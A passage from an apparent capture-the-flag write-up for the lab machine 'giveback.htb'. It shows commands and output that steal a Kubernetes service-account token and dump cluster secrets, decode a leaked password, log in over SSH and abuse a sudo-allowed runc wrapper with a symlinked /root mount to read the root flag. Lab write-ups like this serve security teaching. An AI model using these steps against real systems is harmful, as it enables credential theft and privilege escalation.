lrwxrwxrwx    1 root     root            16 Feb 10 08:39 namespace -> ..data/namespace
lrwxrwxrwx    1 root     root            12 Feb 10 08:39 token -> ..data/token
```

We have kubernetes service token. Let's use that to see if it gives us any secrets.

```bash
/var/www/html/cgi-bin # TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

/var/www/html/cgi-bin # curl -k -H "Authorization: Bearer $TOKEN" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/default/secrets
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0{
  "kind": "SecretList",
  "apiVersion": "v1",
  "metadata": {
    "resourceVersion": "2858114"
  },
  "items": [
    {
      "metadata": {
        "name": "beta-vino-wp-mariadb",
        "namespace": "default",
        "uid": "3473d5ec-b774-40c9-a249-81d51426a45e",
        "resourceVersion": "2088227",
        "creationTimestamp": "2024-09-21T22:17:31Z",
        "labels": {
          "app.kubernetes.io/instance": "beta-vino-wp",
          "app.kubernetes.io/managed-by": "Helm",
          "app.kubernetes.io/name": "mariadb",
          "app.kubernetes.io/part-of": "mariadb",
          "app.kubernetes.io/version": "11.8.2",
          "helm.sh/chart": "mariadb-21.0.0"
        },
        "annotations": {
          "meta.helm.sh/release-name": "beta-vino-wp",
          "meta.helm.sh/release-namespace": "default"
        },
        "managedFields": [
          {
            "manager": "helm",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2025-08-29T03:29:54Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:mariadb-password": {},
                "f:mariadb-root-password": {}
              },
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:meta.helm.sh/release-name": {},
                  "f:meta.helm.sh/release-namespace": {}
                },
                "f:labels": {
                  ".": {},
                  "f:app.kubernetes.io/instance": {},
                  "f:app.kubernetes.io/managed-by": {},
                  "f:app.kubernetes.io/name": {},
                  "f:app.kubernetes.io/part-of": {},
                  "f:app.kubernetes.io/version": {},
                  "f:helm.sh/chart": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "mariadb-password": "c1.....9T",
        "mariadb-root-password": "c1.....Uw=="
      },
      "type": "Opaque"
    },
    {
.
.
.
.
.
.
      },
      "type": "helm.sh/release.v1"
    },
    {
      "metadata": {
        "name": "user-secret-babywyrm",
        "namespace": "default",
        "uid": "1fce7fb1-06dd-4d03-b54e-17ef7254ee49",
        "resourceVersion": "2857925",
        "creationTimestamp": "2026-02-10T07:21:15Z",
        "ownerReferences": [
          {
            "apiVersion": "bitnami.com/v1alpha1",
            "kind": "SealedSecret",
            "name": "user-secret-babywyrm",
            "uid": "86008f17-07a1-42f8-8544-1e013dcde687",
            "controller": true
          }
        ],
        "managedFields": [
          {
            "manager": "controller",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2026-02-10T07:21:15Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:data": {
                ".": {},
                "f:MASTERPASS": {}
              },
              "f:metadata": {
                "f:ownerReferences": {
                  ".": {},
                  "k:{\"uid\":\"86008f17-07a1-42f8-8544-1e013dcde687\"}": {}
                }
              },
              "f:type": {}
            }
          }
        ]
      },
      "data": {
        "MASTERPASS": "Q3.....Uw=="
      },
      "type": "Opaque"
    }
  ]
```

My session died, but I got the master pass for user babywyrm.

```bash
kali@kali:echo "Q3.....Uw==" | base64 -d
Cz.....yS
```

We now have password for user babywyrm, let's login finally into the main machine.

```bash
kali@kali:ssh babywyrm@giveback.htb
The authenticity of host 'giveback.htb (10.129.242.171)' can't be established.
ED25519 key fingerprint is: SHA256:QW0UEukNwOzzXzOIYR311JYiuhYUEv8FYbRgwiKZ35g
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:112: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'giveback.htb' (ED25519) to the list of known hosts.
babywyrm@giveback.htb's password:  
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-124-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Feb 10 07:49:14 2026 from 10.10.16.26
babywyrm@giveback:~$ 
```

Finally, we find our first flag at home directory.

```bash
babywyrm@giveback:~$ cat user.txt
fd.....61
```

Let's see if we have any sudo permissions.

```bash
babywyrm@giveback:~$ sudo -l
Matching Defaults entries for babywyrm on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, timestamp_timeout=0,
    timestamp_timeout=20

User babywyrm may run the following commands on localhost:
    (ALL) NOPASSWD: !ALL
    (ALL) /opt/debug
```

So, user babywyrm can use /opt/debug as root.

```bash
babywyrm@giveback:/opt$ sudo /opt/debug --help
[sudo] password for babywyrm: 
[*] Validating sudo privileges...
[*] Sudo validation successful
Please enter the administrative password: 

babywyrm@giveback:/opt$ 
```

Wait!!! It needs two passwords, babywyrm's ssh password and administrative password. Maybe it is the one we found on wp-config.php of wordpress.

```bash
/** Database username */
define( 'DB_USER', 'bn_wordpress' );

/** Database password */
define( 'DB_PASSWORD', 'sW.....oS' );
```

Let's try with this password.

```bash
babywyrm@giveback:~$ sudo /opt/debug --help
[sudo] password for babywyrm: 
[*] Validating sudo privileges...
[*] Sudo validation successful
Please enter the administrative password: 

[*] Administrative password verified
[*] Processing command: --help
Restricted runc Debug Wrapper

Usage:
  /opt/debug [flags] spec
  /opt/debug [flags] run <id>
  /opt/debug version | --version | -v

Flags:
  --log <file>
  --root <path>
  --debug
```

That was success. This /opt/debug, runs runc. Runc command is a command-line interface (CLI) tool for spawning and running containers on Linux. Let's use that to mount the final flag as a container.

```bash
babywyrm@giveback:~$ cat config.json
{
    "ociVersion": "1.0.2",
    "process": {
        "user": {"uid": 0, "gid": 0},
        "args": ["/bin/cat", "/root/root.txt"],
        "cwd": "/",
        "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],
        "terminal": false
    },
    "root": {"path": "lesgo"},
    "mounts": [
        {"destination": "/proc", "type": "proc", "source": "proc"},
        {"destination": "/bin", "type": "bind", "source": "/bin", "options": ["bind","ro"]},
        {"destination": "/lib", "type": "bind", "source": "/lib", "options": ["bind","ro"]},
        {"destination": "/lib64", "type": "bind", "source": "/lib64", "options": ["bind","ro"]},
        {"destination": "/root", "type": "bind", "source": "/root", "options": ["bind","ro"]}
    ],
    "linux": {"namespaces": [{"type": "mount"}]}
}
```

Let's run it.

```bash
babywyrm@giveback:~$mkdir lesgo

babywyrm@giveback:~$ sudo /opt/debug run rootfs
[*] Validating sudo privileges...
[*] Sudo validation successful
Please enter the administrative password: 

[*] Administrative password verified
[*] Processing command: run
Error: Direct /root mount detected - not permitted
```

We failed. So, using /root directly isnot allowed. We can create a symlink to bypass this check.

```bash
babywyrm@giveback:~$ cat config.json
{
    "ociVersion": "1.0.2",
    "process": {
        "user": {
            "uid": 0,
            "gid": 0
        },
        "args": [
            "/bin/cat",
            "/root/root.txt"
        ],
        "cwd": "/",
        "env": [
            "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
        ],
        "terminal": false
    },
    "root": {
        "path": "rootfs"
    },
    "mounts": [
        {
            "destination": "/proc",
            "type": "proc",
            "source": "proc"
        },
        {
            "destination": "/bin",
            "type": "bind",
            "source": "/bin",
            "options": [
                "bind",
                "ro"
            ]
        },
        {
            "destination": "/lib",
            "type": "bind",
            "source": "/lib",
            "options": [
                "bind",
                "ro"
            ]
        },
        {
            "destination": "/lib64",
            "type": "bind",
            "source": "/lib64",
            "options": [
                "bind",
                "ro"
            ]
        },
        {
            "destination": "/root",
            "type": "bind",
            "source": "/home/babywyrm/not_root",
            "options": [
                "bind",
                "ro"
            ]
        }
    ],
    "linux": {
        "namespaces": [
            {
                "type": "mount"
            }
        ]
    }
}
```

Now, let's create a symlink pointing to root.

```bash
babywyrm@giveback:~$ ln -s /root ./not_root
```

Now, everything is ready, let's run again.

```bash
babywyrm@giveback:~$ sudo /opt/debug run lesgo
[*] Validating sudo privileges...
[*] Sudo validation successful
Please enter the administrative password: 

[*] Administrative password verified
[*] Processing command: run
[*] Starting container: exploit_attempt
9d.....5d
```

We got our final flag.
